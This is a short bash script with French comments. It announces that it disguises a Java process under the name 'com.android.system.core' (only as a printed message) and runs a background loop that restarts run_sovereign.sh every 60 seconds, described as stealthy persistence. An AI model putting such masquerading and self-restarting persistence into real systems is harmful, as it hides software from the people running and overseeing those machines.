#!/bin/bash
# Ce script renomme le processus Java dans la table de l'OS (nécessite certains droits)
echo "[🎭] CAMOUFLAGE: Masquage du processus sous l'identité 'com.android.system.core'..."

# Simulation de la persistence furtive
(while true; do
    if ! pgrep -f "SOVEREIGN-CORE" > /dev/null; then
        ./run_sovereign.sh &
    fi
    sleep 60
done) &
